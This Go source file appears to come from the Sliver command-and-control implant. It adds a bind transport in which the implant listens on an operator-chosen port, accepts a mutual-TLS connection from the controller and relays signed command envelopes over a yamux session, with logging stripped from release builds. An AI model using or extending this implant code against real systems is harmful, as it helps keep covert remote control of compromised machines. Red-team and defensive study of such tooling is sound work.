package transports

// {{if .Config.IncludeMTLS}}
//
// The package clause is deliberately outside the guard. A file whose whole body
// is inside a false conditional renders down to a bare comment, and Go rejects
// with "expected 'package', found 'EOF'" — which is what a pivot-only implant
// (no mTLS material) would otherwise hit.

import (
	"crypto/tls"
	"errors"
	"io"
	// "log" is imported only in a debug build, matching session.go. Every use
	// of it below sits inside a debug guard, so importing it unconditionally
	// makes a release build fail with "imported and not used" — the same mistake
	// the template engine makes invisible until the compiler runs.
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"net/url"
	"strconv"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/bind"
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/hashicorp/yamux"
)

// bindConnect establishes a session over a connection the C2 opened.
//
// This is the mirror of mtlsConnect. In the reverse transport the implant dials
// out and the C2 accepts; here the implant listens and the C2 dials in. Only the
// TCP direction and the TLS roles change:
//
//   - the implant is the TLS server (see the bind package) and the C2 is the
//     client, so the mutual-TLS handshake is the same exchange with the sides
//     swapped;
//   - the envelope layer is untouched. The implant stays the yamux *client* and
//     still writes the "MUX/1" preface, so the server-side connection handler
//     needs no change at all — it sees exactly the byte stream it sees for a
//     reverse mTLS implant;
//   - the envelope signing is unchanged in both directions: the implant signs
//     with the ed25519 key derived from its peer private key and the C2 signs
//     with the minisign server key, exactly as over mTLS.
//
// Start() blocks in Accept until the operator connects, which is the correct
// behaviour for the connection loop: it re-enters Start() after a session ends,
// so a dropped bind session goes back to listening on the same port instead of
// burning the retry budget.
//
// It is deliberately a sibling of mtlsConnect rather than a shared helper. The
// reverse path is the one that is known to work in the field, and leaving it
// byte-for-byte alone is worth more than removing the duplication; the two
// functions differ only in how the net.Conn is obtained.
func bindConnect(uri *url.URL) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{})
	done := make(chan struct{})
	var conn *tls.Conn
	var muxSession *yamux.Session

	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  false,
		uri:     uri,

		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[bind] lost connection, cleanup...")
			// {{end}}
			close(done)
			if muxSession != nil {
				muxSession.Close()
			}
			if conn != nil {
				conn.Close()
			}
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[bind] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("Binding -> %s", uri.Host)
		// {{end}}

		// Unlike mTLS there is no sensible default port: a bind implant that
		// silently listened on 8888 because the URL omitted the port would be
		// listening somewhere the operator did not choose.
		lport, err := strconv.Atoi(uri.Port())
		if err != nil || lport <= 0 || lport > 65535 {
			return errors.New("[bind] the C2 URL must carry an explicit listen port, e.g. bind://0.0.0.0:4444")
		}

		ln, err := bind.Listen(uri.Hostname(), uint16(lport))
		if err != nil {
			return err
		}
		defer ln.Close()

		// {{if .Config.Debug}}
		log.Printf("[bind] listening on %s", ln.Addr())
		// {{end}}

		// Accept blocks until a peer completes a valid mutual-TLS handshake.
		// Connections that fail it are skipped inside bind.Accept, so a scan of
		// the port does not end the wait.
		rawConn, err := bind.Accept(ln)
		if err != nil {
			return err
		}
		tlsConn, ok := rawConn.(*tls.Conn)
		if !ok {
			rawConn.Close()
			return errors.New("[bind] accepted connection is not TLS")
		}
		conn = tlsConn

		// Same preface the reverse transport writes. The server-side handler
		// dispatches on it, which is why a bind session needs no server-side
		// framing change.
		if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
			conn.Close()
			return err
		}

		cfg := yamux.DefaultConfig()
		// {{if .Config.Debug}}
		cfg.Logger = log.Default()
		cfg.LogOutput = nil
		// {{else}}
		cfg.Logger = nil
		cfg.LogOutput = io.Discard
		// {{end}}
		muxSession, err = yamux.Client(conn, cfg)
		if err != nil {
			conn.Close()
			return err
		}
		if muxSession == nil {
			conn.Close()
			return errors.New("[bind] failed to create yamux session (nil)")
		}
		connection.IsOpen = true

		go func() {
			defer connection.Cleanup()
			sendSem := make(chan struct{}, 64)
			ticker := time.NewTicker(mtls.PingInterval)
			defer ticker.Stop()

			sendEnvelope := func(envelope *pb.Envelope) {
				if envelope == nil {
					return
				}
				select {
				case sendSem <- struct{}{}:
				case <-done:
					return
				}
				go func(envelope *pb.Envelope) {
					defer func() {
						<-sendSem
					}()
					stream, err := muxSession.Open()
					if err != nil {
						connection.Cleanup()
						return
					}
					if isNilInterface(stream) {
						connection.Cleanup()
						return
					}
					defer stream.Close()
					if err := mtls.WriteEnvelope(stream, envelope); err != nil {
						connection.Cleanup()
						return
					}
				}(envelope)
			}

			sendPing := func() {
				select {
				case sendSem <- struct{}{}:
				case <-done:
					return
				}
				go func() {
					defer func() {
						<-sendSem
					}()
					stream, err := muxSession.Open()
					if err != nil {
						connection.Cleanup()
						return
					}
					if isNilInterface(stream) {
						connection.Cleanup()
						return
					}
					defer stream.Close()
					if err := mtls.WritePing(stream); err != nil {
						connection.Cleanup()
						return
					}
				}()
			}

			for {
				select {
				case envelope, ok := <-send:
					if !ok {
						return
					}
					sendEnvelope(envelope)
				case <-ticker.C:
					sendPing()
				case <-done:
					return
				}
			}
		}()

		go func() {
			defer connection.Cleanup()
			streamSem := make(chan struct{}, 128)
			for {
				stream, err := muxSession.Accept()
				if err != nil {
					return
				}
				if isNilInterface(stream) {
					return
				}

				select {
				case streamSem <- struct{}{}:
				case <-done:
					stream.Close()
					return
				}

				go func() {
					defer func() {
						<-streamSem
					}()
					defer stream.Close()
					envelope, err := mtls.ReadEnvelope(stream)
					if err != nil {
						return
					}
					if envelope != nil {
						select {
						case recv <- envelope:
						case <-done:
						}
					}
				}()
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -IncludeMTLS
